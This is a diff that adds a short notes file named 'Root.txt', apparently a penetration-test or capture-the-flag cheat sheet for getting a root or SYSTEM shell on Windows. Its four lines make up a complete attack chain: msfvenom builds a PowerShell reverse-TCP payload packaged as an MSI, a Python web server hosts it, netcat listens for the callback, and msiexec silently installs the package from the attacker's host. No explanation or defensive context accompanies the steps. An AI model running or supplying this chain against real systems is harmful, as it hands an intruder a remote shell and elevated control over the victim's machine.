@@ -1,0 +1,9 @@
+Root.txt
+
+msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f msi > cmd.msi
+
+python3 -m http.server
+
+nc -lvp PORT
+
+msiexec.exe /q /i http://IP/cmd.msi
